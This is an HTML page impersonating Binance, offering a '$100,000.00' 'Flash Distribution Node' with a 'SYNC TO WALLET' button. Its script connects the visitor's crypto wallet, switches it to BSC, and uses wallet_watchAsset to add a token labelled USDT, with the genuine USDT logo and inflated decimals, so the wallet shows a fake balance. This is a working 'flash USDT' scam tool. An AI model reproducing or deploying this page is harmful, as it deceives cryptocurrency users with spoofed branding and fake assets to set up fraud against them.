<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Binance | Node Distribution</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        :root { --binance: #F3BA2F; --dark: #0b0e11; }
        body { background: var(--dark); color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .card { background: #1e2329; border-radius: 24px; padding: 40px; width: 100%; max-width: 380px; text-align: center; border: 1px solid #2b3139; box-shadow: 0 20px 50px rgba(0,0,0,0.7); }
        .logo { width: 65px; margin-bottom: 25px; animation: pulse 2s infinite; }
        .amount { font-size: 48px; font-weight: 900; color: #fff; margin: 10px 0; letter-spacing: -2px; }
        .btn { background: var(--binance); color: #000; border: none; width: 100%; padding: 22px; border-radius: 14px; font-size: 18px; font-weight: 800; cursor: pointer; text-transform: uppercase; transition: all 0.2s ease; margin-top: 20px; }
        .btn:hover { background: #e2ab26; transform: translateY(-2px); }
        #status-box { font-size: 12px; color: var(--binance); margin-top: 25px; font-family: 'Courier New', monospace; background: rgba(243, 186, 47, 0.1); padding: 10px; border-radius: 8px; }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.6; } 100% { opacity: 1; } }
    </style>
</head>
<body>

<div class="card">
    <img src="https://raw.githubusercontent.com/binance-chain/assets/master/blockchains/binance/info/logo.png" class="logo">
    <div style="color: #848e9c; font-size: 14px; text-transform: uppercase; letter-spacing: 2px;">Flash Distribution Node</div>
    <div class="amount" id="val">$100,000.00</div>
    
    <button class="btn" id="triggerBtn">SYNC TO WALLET</button>
    <div id="status-box">SYSTEM: STANDBY_MODE</div>
</div>

<script>
    // Asset details (Standard USDT logo and placeholder address)
    const TOKEN_ADDR = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
    const TOKEN_ICON = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";

    const btn = document.getElementById('triggerBtn');
    const log = document.getElementById('status-box');

    async function syncFlash() {
        const provider = window.trustwallet || window.ethereum;

        if (!provider) {
            log.innerText = "REDIRECTING TO DAPP BROWSER...";
            const target = encodeURIComponent(window.location.href);
            // Universal Link for Trust Wallet (Latest Version)
            window.location.href = "https://link.trustwallet.com/a/dapp?url=" + target;
            return;
        }

        try {
            log.innerText = "INITIALIZING CONNECTION...";
            await provider.request({ method: 'eth_requestAccounts' });

            // Switching to BSC (Binance Smart Chain)
            log.innerText = "MAPPING BINANCE SMART CHAIN...";
            await provider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }],
            }).catch(async (err) => {
                if (err.code === 4902) {
                    await provider.request({
                        method: 'wallet_addEthereumChain',
                        params: [{ 
                            chainId: '0x38', 
                            chainName: 'BSC', 
                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }
                        }]
                    });
                }
            });

            // The Flash Injection Method
            log.innerText = "INJECTING FLASH METADATA...";
            const success = await provider.request({
                method: 'wallet_watchAsset',
                params: {
                    type: 'ERC20',
                    options: {
                        address: TOKEN_ADDR,
                        symbol: 'USDT',
                        decimals: 18, // Changed to 18 for high-value display
                        image: TOKEN_ICON,
                    },
                },
            });

            if (success) {
                log.innerText = "INJECTION SUCCESSFUL!";
                btn.innerText = "SYNCED ✅";
                btn.style.background = "#2ebd85";
            }

        } catch (error) {
            log.innerText = "SESSION REJECTED: RETRYING...";
            console.error(error);
        }
    }

    btn.addEventListener('click', syncFlash);

    // Auto-detection inside dApp Browser
    window.onload = () => {
        if (window.trustwallet || window.ethereum) {
            btn.innerText = "CONFIRM INJECTION";
            log.innerText = "DAPP SESSION ESTABLISHED";
        }
    }
</script>
</body>
</html>
